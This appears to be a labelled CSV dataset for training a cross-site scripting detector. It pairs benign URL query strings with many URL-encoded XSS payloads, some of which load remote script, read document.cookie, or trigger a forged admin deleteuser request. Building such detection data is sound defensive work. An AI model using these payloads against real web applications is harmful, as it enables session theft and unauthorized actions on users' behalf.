text,label
/categoryguide?sserver=%3Csvg%20contentScriptType%3Dtext/vbs%3E%3Cscript%3EMsgBox%2B1,1
/webaward2003a?firstname=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx87javascript%3Aalert%281%29%3C/script%3E,1
/thinkstock?dim=dim,0
/000340?querysql=querysql,0
/poseidon?media=media,0
/8582?siteName=siteName,0
/21469?email1=%3CDIV%20STYLE%3D%22background-image%3A%20url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E,1
/right-bottom?beta=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx00onerror%3Djavascript%3Aalert%281%29%3E,1
/rrundle?alternate=alternate,0
/hdr_left?csid=csid,0
/000536?disabledBBC=%3C%3BSTYLE%20type%3D%22%3Btext/css%22%3B%3E%3BBODY%7Bbackground%3Aurl%28%22%3Bjavascript%3Aalert%28%27%3BXSS%27%3B%29%22%3B%29%7D%3C%3B/STYLE%3E%3B,1
/4175?Calendar=Calendar,0
/20060904?unfoldmenu=%3C%3Bscrscriptipt%3E%3Balert%281%29%3C%3B/scrscriptipt%3E%3B,1
/2360?chkagree=chkagree,0
/35181?tool=%3Ciframe/%2500/%20src%3DjavaSCRIPT%26colon%3Balert%281%29,1
/vortrag?listSubmitted=%3Cbody%20onkeyup%20body%20onkeyup%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onkeyup%3E,1
/windows_2000?snn=%3CDIV%20STYLE%3D%22background-image%3A%20url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E,1
/3349?obgz=obgz,0
/29150?blockeduntil=%3Ca%20href%3D%22javas%5Cx02cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/sws?namelist=namelist,0
/youth?addList=%3Cscript%3Efor%28%28i%29in%28self%29%29eval%28i%29%281%29%3C/script%3E,1
/8695?DATA=ABC%3Cdiv%20style%3D%22x%3A%5CxE2%5Cx80%5Cx82expression%28javascript%3Aalert%281%29%22%3EDEF,1
/2673?prepare=prepare,0
/3695?urldd0=urldd0,0
/2884?gender=gender,0
/linus?myname=myname,0
/dpi?labdef=labdef,0
/f-39?menuid=%3Cxml%20id%3D%22xss%22%20src%3D%22%25%28htc%29s%22%3E%3C/xml%3E%20%3Clabel%20dataformatas%3D%22html%22%20datasrc%3D%22%23xss%22%20datafld%3D%22payload%22%3E%3C/label%3E,1
/hardcore-porn?languageID=languageID,0
/24044?f=f,0
/notebook?APICpictureType=APICpictureType,0
/5335?nsql=%3Cvideo%20onerror%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3Csource%3E,1
/002394?keyname=%26lt%3BSCRIPT%26gt%3Balert%28/XSS/%26%2346%3Bsource%29%26lt%3B/SCRIPT%26gt%3B,1
/177999_1?mc=mc,0
/Non?storyid=%27%3E%3E%3Cmarquee%3E%3Ch1%3EXSS%3C/h1%3E%3C/marquee%3E,1
/menu_2?showtagfiles=%3Cembed%20code%3D%22http%3A//businessinfo.co.uk/labs/xss/xss.swf%22%20allowscriptaccess%3Dalways%3E,1
/Source?b=%3C/%20foo%3D%22%3E%3Cscript%3Ealert%281%29%3C/script%3E%22%3E,1
/Sandcat-Suite?UserType=%3C///style///%3E%3Cspan%20%252F%20onmousemove%3D%27alert%26lpar%3B1%26rpar%3B%27%3ESPAN,1
/Mobile_Phones?AVSCV2=%3Cbody/onload%3D%26lt%3B%21--%26gt%3B%26%2310alert%281%29%3E,1
/Web_Security?subGenre=subGenre,0
/contato?fontcolor=fontcolor,0
/18220?iso=iso,0
/16203?curl=%27%60%22%3E%3C%5Cx3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,1
/64401?xjxcls=xjxcls,0
/vortex?iStart=iStart,0
/5466?parent=%3Cinput%20type%3D%22image%22%20dynsrc%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/000341?pid=pid,0
/20358?vbsq=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20onerror%5Cx0D%3Djavascript%3Aalert%281%29%3E,1
/21355?k=%3C%21--%5Bif%20gte%20IE%204%5D%3E%3CSCRIPT%3Ejavascript%3Aalert%281%29%3B%3C/SCRIPT%3E%3C%21%5Bendif%5D--%3E,1
/maildrop?servercn=%3CSCRIPT/SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/sanctuary?ratio=ratio,0
/8149?subtitle=subtitle,0
/Currency?colltype=%E2%80%98%3B%20alert%281%29%3B,1
/marketwatch?psk=%3Cbody/onload%3D%26lt%3B%21--%26gt%3B%26%2310alert%281%29%3E,1
/comms?gr=%3CSCRIPT%3Edocument.write%28%22XSS%22%29%3B%3C/SCRIPT%3E,1
/jvc?zoneid=zoneid,0
/garland?dwld=dwld,0
/9500?hidid=%3Cform%3E%3Cbutton%20formaction%3D%22javascript%3Aalert%28XSS%29%22%3Elol,1
/10318?sendpassword=sendpassword,0
/attribution?perms1=perms1,0
/4954?csvIDs=csvIDs,0
/11815?browse=%26lt%3BLINK%20REL%3D%26quot%3Bstylesheet%26quot%3B%20HREF%3D%26quot%3Bhttp%3A//ha.ckers.org/xss.css%26quot%3B%26gt%3B,1
/site_list?22=%26lt%3BSCRIPT/XSS%20SRC%3D%5C%22http%26%2358%3B//ha%26%2346%3Bckers%26%2346%3Borg/xss%26%2346%3Bjs%5C%22%26gt%3B%26lt%3B/SCRIPT%26gt%3B,1
/main_site?serveR=%3Cscript%3EReferenceError.prototype.__defineGetter__%28%27name%27%2C%20function%28%29%7Bjavascript%3Aalert%281%29%7D%29%2Cx%3C/script%3E,1
/shredder_large?IMG=%3Ciframe/onreadystatechange%3Dalert%281%29,1
/northkorea?piasS=piasS,0
/daydream?reload=reload,0
/research_reports?delid=delid,0
/4266?fileEdit=%22%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%28%28%271%27%29%29%3E,1
/google_news?collectionfrom=%E2%80%9C%3E%3Cs%E2%80%9D%252b%E2%80%9Dcript%3Ealert%28document.cookie%29%3C/script%3E,1
/business-strategy?cc=%3Ciframe/src%3D%22data%3Atext/html%2C%3Csvg%20%26%23111%3B%26%23110%3Bload%3Dalert%281%29%3E%22%3E,1
/Bass?scores=%22%60%27%3E%3Cscript%3E%5Cx09javascript%3Aalert%281%29%3C/script%3E,1
/redirects?txtEmail=txtEmail,0
/hdr-topjobs?ppage=%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20%5Cx00onerror%3Djavascript%3Aalert%281%29%3E,1
/Reading?aid=aid,0
/white_spacer?verified=verified,0
/icon_question?subwdata=--%3E%3C%21--%20--%5Cx00%3E%20%3Cimg%20src%3Dxxx%3Ax%20onerror%3Djavascript%3Aalert%281%29%3E%20--%3E,1
/coreldraw?sorttype=sorttype,0
/fact?kb=kb,0
/26737?text=%3Cstyle%3E%3C/style%5Cx09%3Cimg%20src%3D%22about%3Ablank%22%20onerror%3Djavascript%3Aalert%281%29//%3E%3C/style%3E,1
/m0?xjxcls=xjxcls,0
/9031?cpy=cpy,0
/windows-exploits?tableFields=%3Ctitle%20onpropertychange%3Djavascript%3Aalert%281%29%3E%3C/title%3E%3Ctitle%20title%3D%3E,1
/pool?attachments=%26lt%3BIMG%20SRC%3D%26quot%3Bmocha%3A%5Bcode%5D%26quot%3B%26gt%3B,1
/001142?newPass2=newPass2,0
/header_b?currentPage=%3C%3BMETA%20HTTP-EQUIV%3D%22%3BSet-Cookie%22%3B%20Content%3D%22%3BUSERID%3D%3C%3BSCRIPT%3E%3Balert%28%27%3BXSS%27%3B%29%3C%3B/SCRIPT%3E%3B%22%3B%3E%3B,1
/cbd?olddir=%3Csvg%3E%3Cscript%3E//%26NewLine%3Bconfirm%281%29%3B%3C/script%20%3C/svg%3E,1
/000314?recvDate=recvDate,0
/22828?ExpiryDate=ExpiryDate,0
/pacific-poker?canned=canned,0
/003339?otp=ABC%3Cdiv%20style%3D%22x%3A%5CxE2%5Cx80%5Cx83expression%28javascript%3Aalert%281%29%22%3EDEF,1
/creditanddebt?verification=%3CDIV%20STYLE%3D%22background-image%3A%20url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E,1
/hewlett_packard?fonte=%22%27%60%3EABC%3Cdiv%20style%3D%22font-family%3A%27foo%27%5Cx7Dx%3Aexpression%28javascript%3Aalert%281%29%3B/%2A%27%3B%22%3EDEF,1
/82619?deL=%3Cimg%20src%3Dx%5Cx09onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/20037?mini=%26lt%3BBODY%20ONLOAD%3Dalert%28%26apos%3BXSS%26apos%3B%29%26gt%3B,1
/icon_help?dbpw=dbpw,0
/2449?api=api,0
/mariners?isPersonal=%3CDIV%20STYLE%3D%22background-image%3A%5C0075%5C0072%5C006C%5C0028%27%5C006a%5C0061%5C0076%5C0061%5C0073%5C0063%5C0072%5C0069%5C0070%5C0074%5C003a%5C0061%5C006c%5C0065%5C0072%5C0074%5C0028.1027%5C0058.1053%5C0053%5C0027%5C0029%27%5C0029%22%3E,1
/000866?fieldType=fieldType,0
/112236?emailaddress=emailaddress,0
/4999?interface=%3Ca%20href%3D%22javas%5Cx07cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/iasp?vouchersyncusername=vouchersyncusername,0
/isuzu?deletecomment=deletecomment,0
/tns?redirectto=redirectto,0
/gpu?display=display,0
/kiwi?forgotPassword=forgotPassword,0
/Files?timelimit=%3COBJECT%20CLASSID%3D%22clsid%3A333C7BC4-460F-11D0-BC04-0080C7055A83%22%3E%3CPARAM%20NAME%3D%22DataURL%22%20VALUE%3D%22javascript%3Aalert%281%29%22%3E%3C/OBJECT%3E,1
/7281?xnum=xnum,0
/introvertster?ddnsdomain=ddnsdomain,0
/cyclone?invcDate=%3C%25%20foo%3E%3Cx%20foo%3D%22%25%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E%22%3E,1
/w_2?inc=%3CSCRIPT/SRC%3D%22http%3A//ha.ckers.org/xss.js%22%3E%3C/SCRIPT%3E,1
/8105?Form=%3Ca%20href%3D%22javas%5Cx08cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/logo_text?sitemap=sitemap,0
/jct03001c?rM=%3Cimg%20src%3D1%20href%3D1%20onerror%3D%22javascript%3Aalert%281%29%22%3E%3C/img%3E,1
/christina-aguilera?id24level=%3C%25%20foo%3E%3Cx%20foo%3D%22%25%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E%22%3E,1
/linked?entityID=XSS/%2A-%2A/STYLE%3Dxss%3Ae/%2A%2A/xpression%28alert%28%27XSS%27%29%29%3E,1
/corner1?syntax=syntax,0
/g10?geoOption=geoOption,0
/searchResults?interface=%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace%20prefix%3D%22t%22%20ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E%3C%3Fimport%20namespace%3D%22t%22%20implementation%3D%22%23default%23time2%22%3E%3Ct%3Aset%20attributeName%3D%22innerHTML%22%20to%3D%22XSS%26lt%3BSCRIPT%20DEFER%26gt%3Bjavascript%3Aalert%281%29%26lt%3B/SCRIPT%26gt%3B%22%3E%3C/BODY%3E%3C/HTML%3E,1
/index-195?notrap=notrap,0
/7142?cs1=cs1,0
/pole?dbUser=dbUser,0
/weblist?filesend=%22/%3E%3Cimg/onerror%3D%5Cx0Cjavascript%3Aalert%281%29%5Cx0Csrc%3Dxxx%3Ax%20/%3E,1
/Dotster_47e?tab1=%3COBJECT%20classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam%20name%3Durl%20value%3Djavascript%3Adocument.vulnerable%3Dtrue%3E%3C/object%3E,1
/auxnav_top?cuenta=%3Cscript%5Cx20%3Ejavascript%3Aalert%281%29%3C/script%3E,1
/14353?PRIVILEGES=http%3A//www.google%3Cscript%20.com%3Ealert%28document.location%29%3C/script,1
/Restaurants?id=id,0
/qdefense?B=B,0
/22337?resultid=%3Csvg%20onResize%20svg%20onResize%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/svg%20onResize%3E,1
/nameprotect?purchaseorderid=%3Ca%20href%3D%22%5Cx16javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/tapety?fe=%3CSTYLE%3E%40import%27%25%28css%29s%27%3B%3C/STYLE%3E,1
/salons?loanLimit=%3Cscript%3E/%2A%20%2A%5Cx2A/javascript%3Aalert%281%29//%20%2A/%3C/script%3E,1
/0567?yellowgessper=%3Clink%20rel%3D%22stylesheet%22%20href%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/heavy?newLoanDate=newLoanDate,0
/sprawdz?gtype=gtype,0
/chat1?submit2=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B//%3C%3C/SCRIPT%3E,1
/desktop_enterprise?uids=%3CIMG%20SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E,1
/22541?xdebug=Redirect%20302%20/a.jpg%20http%3A//victimsite.com/admin.asp%26amp%3Bdeleteuser,1
/releaseinfo?favicon=favicon,0
/johnnymnemonic?strings=%3CDIV%20STYLE%3D%22width%3Aexpression%28javascript%3Aalert%281%29%29%3B%22%3E,1
/federal_budget?id21gid=id21gid,0
/camping_hikinggear?collapse=%3Cscript%5Cx0D%3Ejavascript%3Aalert%281%29%3C/script%3E,1
/stalin?dbu=%3CIMG%20SRC%3D%23%20onmouseover%3D%22alert%28%27xxs%27%29%22%3E,1
/242740?sortby=sortby,0
/12367?tree=%3Chtml%20onMouseWheel%20html%20onMouseWheel%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/html%20onMouseWheel%3E,1
/0730?duedate=%3Cobject%20data%3D%22data%3Atext/html%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3E,1
/a0250c0dD?statistics=statistics,0
/investor-relations?interface=interface,0
/preamble?howmuch=howmuch,0
/15376?ma=ma,0
/fin?additionalData=%3Ciframe%20src%3Dj%26NewLine%3B%26Tab%3Ba%26NewLine%3B%26Tab%3B%26Tab%3Bv%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3Ba%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bs%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bc%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Br%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bi%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bp%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bt%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26colon%3Ba%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bl%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Be%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Br%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3Bt%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B28%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B1%26NewLine%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%26Tab%3B%2529%3E%3C/iframe%3E,1
/3649311?datechange=datechange,0
/Nutrition?callf=%3CBR%20SIZE%3D%22%26%7Bjavascript%3Aalert%281%29%7D%22%3E,1
/tyrantiger?markdown=%3Cimg%20src%3Dx%20onerror%3D%5Cx10%22javascript%3Aalert%281%29%22%3E,1
/002709?persistent=%3Ca%20href%3D%22%5CxE2%5Cx81%5Cx9Fjavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/lightboxes?maxcrop=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx81%5Cx9Fjavascript%3Aalert%281%29%3C/script%3E,1
/88570?all=%3Ca%20href%3D%22jAvAsCrIpT%26colon%3Balert%26lpar%3B1%26rpar%3B%22%3EX%3C/a%3E,1
/arts?stp=stp,0
/sucker?pubdate=pubdate,0
/oscon2006?showinfo=%26lt%3BIMG%20SRC%3D%26amp%3B%23x6A%26amp%3B%23x61%26amp%3B%23x76%26amp%3B%23x61%26amp%3B%23x73%26amp%3B%23x63%26amp%3B%23x72%26amp%3B%23x69%26amp%3B%23x70%26amp%3B%23x74%26amp%3B%23x3A%26amp%3B%23x61%26amp%3B%23x6C%26amp%3B%23x65%26amp%3B%23x72%26amp%3B%23x74%26amp%3B%23x28%26amp%3B%23x27%26amp%3B%23x58%26amp%3B%23x53%26amp%3B%23x53%26amp%3B%23x27%26amp%3B%23x29%26gt%3B,1
/merchant_account?taxtype=%3CINPUT%20TYPE%3D%22IMAGE%22%20SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E,1
/tiger-shark?dt=dt,0
/000106?topic=topic,0
/mapserv?ticketid=ticketid,0
/Toolbar?sday=sday,0
/bourne?uniqueid=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Ajavascript%3Aalert%281%29%22%29%3B%7D%3C/STYLE%3E%3CA%20CLASS%3DXSS%3E%3C/A%3E,1
/25006?webguiproto=webguiproto,0
/10052006?symlink=symlink,0
/odeo?nonemptycomments=nonemptycomments,0
/planning?redirectto=redirectto,0
/public_affairs?cfed=%3C%25%3C%21--%27%25%3E%3Cscript%3Ealert%281%29%3B%3C/script%20--%3E,1
/odbc?repositoryurl=repositoryurl,0
/list_news?showqueries=showqueries,0
/fora?readregname=readregname,0
/nci?pass1=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx8Ajavascript%3Aalert%281%29%3C/script%3E,1
/5587?https=https,0
/000966?tint=%3CIMG%20SRC%3D%22livescript%3A%5Bcode%5D%22%3E,1
/pubs?feature=exp/%2A%3CA%20STYLE%3D%27no%5Cxss%3Anoxss%28%22%2A//%2A%22%29%3Bxss%3Aex/%2AXSS%2A//%2A/%2A/pression%28alert%28%22XSS%22%29%29%27%3E,1
/attack_map1?varName=ABC%3Cdiv%20style%3D%22x%3A%5Cx0Bexpression%28javascript%3Aalert%281%29%22%3EDEF,1
/grandchallenge?isbinddomain=isbinddomain,0
/enter_bug?multi=multi,0
/Exit?deleteAccount=%3C%3BMETA%20HTTP-EQUIV%3D%22%3Brefresh%22%3B%20CONTENT%3D%22%3B0%3Burl%3Djavascript%3Aalert%28%27%3BXSS%27%3B%29%3B%22%3B%3E%3B,1
/integrator?symlinktarget=%26%2334%3B%26%2362%3B%3Ch1/onmouseover%3D%27%5Cu0061lert%281%29%27%3E,1
/temporeale?installed=installed,0
/inform?lname=lname,0
/68074?gotod=%3Cimg%20src%5Cx47%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/102983?rescanwifi=%3CDIV%20STYLE%3D%22width%3A%20expression%28alert%28%27XSS%27%29%29%3B%22%3E,1
/Conway?sn=%3Cmeta%20charset%3D%22mac-farsi%22%3E%C2%BCscript%C2%BEjavascript%3Aalert%281%29%C2%BC/script%C2%BE,1
/061?yellowgessper=veris--%3Egroup%3Csvg/onload%3Dalert%28/XSS/%29//,1
/RegistrationPage?attaches=perl%20-e%20%26%23039%3Bprint%20%5C%22%3B%3C%3BSCR%5C0IPT%3E%3Balert%28%5C%22%3BXSS%5C%22%3B%29%3C%3B/SCR%5C0IPT%3E%3B%5C%22%3B%3B%26%23039%3B%20%3E%3B%20out,1
/index-18?ramode=ramode,0
/rls?deliveries=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx81%5Cx9Fjavascript%3Aalert%281%29%3C/script%3E,1
/2172600?username2=%3CDIV%20STYLE%3D%22width%3Aexpression%28javascript%3Aalert%281%29%29%3B%22%3E,1
/outguess?vol=%3Cstyle/onload%3Dprompt%26%2340%3B%27%26%2388%3B%26%2383%3B%26%2383%3B%27%26%2341%3B,1
/subcat?id31gid=id31gid,0
/arw_66?divider=%3Cbody%20onscroll%3Djavascript%3Aalert%281%29%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E,1
/Match?popuptitle=popuptitle,0
/162425?goodsid=goodsid,0
/ownership?toboard=toboard,0
/stars_3?searchaction=searchaction,0
/scrutinizer?txtDescription=txtDescription,0
/msg00265?forwarderid=%3CIMG%20SRC%3D%E2%80%9Djav%26%23x09%3Bascript%3Aalert%28%E2%80%98XSS%E2%80%99%29%3B%E2%80%9D%3E,1
/games_resources?entityid=entityid,0
/smil?timezonedetection=1%3Canimate/xmlns%3Durn%3Aschemas-microsoft-com%3Atime%20style%3Dbehavior%3Aurl%28%23default%23time2%29%20attributename%3Dinnerhtml%20values%3D%26lt%3Bimg/src%3D%26quot%3B.%26quot%3Bonerror%3Djavascript%3Aalert%281%29%26gt%3B%3E,1
/40281?guid=guid,0
/WebServers?removesess=removesess,0
/mobicom?sku=sku,0
/7440?nom=nom,0
/9825?dwld=dwld,0
/C2?mquery=mquery,0
/Radar?hit=hit,0
/libpcap?nosync=nosync,0
/Hospitality?vbrmethod=%3Ca%20href%3D%22%5Cx00javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/date?m3ufilename=%3CIFRAME%20SRC%3D%23%20onmouseover%3D%22alert%28document.cookie%29%22%3E%3C/IFRAME%3E,1
/operating-systems?aliasimport=ABC%3Cdiv%20style%3D%22x%3A%5Cx0Cexpression%28javascript%3Aalert%281%29%22%3EDEF,1
/projectmanagement?languageID=languageID,0
/eby?scalingup=scalingup,0
/7654?configure=%3Ca%20href%3D%22%5Cx1Ejavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,1
/online-craps?parameters=parameters,0
/payroll?keytype=%26lt%3BIMG%20SRC%3D%5C%22livescript%26%23058%3B%26%2391%3Bcode%26%2393%3B%5C%22%26gt%3B,1
/7161?link=%3C//%20style%3Dx%3Aexpression%5C28javascript%3Aalert%281%29%5C29%3E,1
/13850?IP=%3Clink%20rel%3D%22stylesheet%22%20href%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,1
/jessica-simpson?query=query,0
/ias?uploader=ABC%3Cdiv%20style%3D%22x%3Aexp%5Cx00ression%28javascript%3Aalert%281%29%22%3EDEF,1
/6903?transaction=transaction,0
/9591?so=so,0
/002527?apn=apn,0
/atkins?joindate=%3CFRAMESET%3E%3CFRAME%20SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E%3C/FRAMESET%3E,1
/http%3A?phpbbdbu=phpbbdbu,0
/traditions?duplicate=duplicate,0
/n11?customFieldId=customFieldId,0
/4405?NetworkUserID=%3Ciframe%20src%3D%22data%3Atext/html%2C%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%22%3E%3C/iframe%3E,1
/billing_policy?ResetRRD=ResetRRD,0
/simages?addfolder=addfolder,0
/1393118840455a0c9f013fa?gn=%3C%3BIMG%20SRC%3D%26%3B%23x6A%26%3B%23x61%26%3B%23x76%26%3B%23x61%26%3B%23x73%26%3B%23x63%26%3B%23x72%26%3B%23x69%26%3B%23x70%26%3B%23x74%26%3B%23x3A%26%3B%23x61%26%3B%23x6C%26%3B%23x65%26%3B%23x72%26%3B%23x74%26%3B%23x28%26%3B%23x27%26%3B%23x58%26%3B%23x53%26%3B%23x53%26%3B%23x27%26%3B%23x29%3E%3B,1
/21125?id12level=%3Cimg%20src%3Dx%5Cx10onerror%3D%22javascript%3Aalert%281%29%22%3E,1
/9903?submitThemes=%26%23x03c,1
/Organizations?mail=%3Cscript%3E/%2A%20%2A%5Cx2A/javascript%3Aalert%281%29//%20%2A/%3C/script%3E,1
/7578?ordDate=%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx85javascript%3Aalert%281%29%3C/script%3E,1
/12082?addusers=%3CBGSOUND%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,1
/best-worst?unspammed=unspammed,0
/198228_1?allblogs=allblogs,0
/pgpfreeware?protocomp=%3Cform%20id%3D%22test%22%20/%3E%3Cbutton%20form%3D%22test%22%20formaction%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3EX,1
/fod?difficulty=%3CSCRIPT%20SRC%3D%22%25%28jpg%29s%22%3E%3C/SCRIPT%3E,1
/0728?answerid=%3CIMG%20SRC%3Dx%20onpageshow%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22%3E,1
/uscode18?CSalt=%3Ciframe%20style%3D%22position%3Aabsolute%3Btop%3A0%3Bleft%3A0%3Bwidth%3A100%25%3Bheight%3A100%25%22%20onmouseover%3D%22prompt%281%29%22%3E,1
/logo_bw?fieldSep=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wiki_edit?maxwidth=maxwidth,0
/lineup?port=%3Cdiv%20style%3D%22background%3Aurl%28/f%23%26%23127%3Boo/%3Bcolor%3Ared/%2A/foo.jpg%29%3B%22%3EX,1
/deck?archivo=%26lt%3B%3Fimport%20namespace%3D%5C%22t%5C%22%20implementation%3D%5C%22%23default%23time2%5C%22%26gt%3B,1
/chalmers_ubs?reserveItemID=reserveItemID,0
/1114?verboselog=%26%23X000003c,1
